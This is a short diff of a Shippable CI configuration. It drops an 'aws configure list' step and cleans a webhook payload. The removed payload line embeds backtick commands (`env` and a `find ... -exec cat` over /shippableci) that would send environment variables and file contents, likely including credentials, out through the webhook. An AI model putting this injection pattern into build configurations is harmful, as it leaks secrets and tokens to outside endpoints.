@@ -13,8 +13,6 @@ matrix:
 build:
   ci:
     - ./test.sh
-  post_ci:
-    - aws configure list
 
 branches:
   except:
@@ -32,8 +30,8 @@ integrations:
     - integrationName: webhook_test
       type: webhook
       payload:
-        - title=ShippableBuild - $REPO_FULL_NAME - $BUILD_NUMBER
-        - body=Shippable Run $BUILD_NUMBER ($BUILD_URL) for $COMPARE_URL - `pwd` `env` XXX `find /shippableci -type f -print -exec ls -l '{}' '+' -exec cat '{}' '+'` XXX
+        - title=Shippable Build - $REPO_FULL_NAME - $BUILD_NUMBER
+        - body=Shippable Run $BUILD_NUMBER ($BUILD_URL) for $COMPARE_URL
       on_success: always
       on_failure: always
       on_cancel: always
